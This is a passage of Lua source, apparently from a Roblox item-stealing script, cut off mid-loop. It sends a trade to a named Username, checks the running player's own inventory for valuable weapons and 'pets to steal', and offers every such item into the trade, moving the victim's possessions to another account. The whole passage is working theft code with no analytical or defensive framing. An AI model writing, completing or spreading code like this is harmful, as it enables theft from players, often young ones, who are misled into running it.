    local function verifyWithExtraTrade(Username)
        while IsTrading() ~= "None" do
            task.wait(0.2)
        end

        local sent = false
        for _ = 1, 3 do
            sent = SendTrade(Username)
            if sent then break end
            task.wait(0.5)
        end

        if not sent then
            return reliableCleanCheck(4)
        end

        local startWait = tick()
        while IsTrading() ~= "StartTrade" and tick() - startWait < 10 do
            task.wait(0.1)
        end

        if IsTrading() ~= "StartTrade" then
            return reliableCleanCheck(4)
        end

        local freshData = InventoryRemote:InvokeServer(LocalPlayer.Name)
        if freshData and freshData.Weapons then
            local freshWeapons = freshData['Weapons']['Owned']
            local stillHasItems = hasItemsAboveRarity(freshWeapons) or hasPetsToSteal()

            if not stillHasItems then
                pcall(stop_trade)
                task.wait(0.3)
                return reliableCleanCheck(2)
            else
                local freshHits = GetSortedInventoryFromData(freshWeapons)
                for _, v in ipairs(freshHits) do
                    for _ = 1, v.Amount do
                        pcall(function()
                            TradeService.OfferItem:FireServer(v.ID, v.Class)
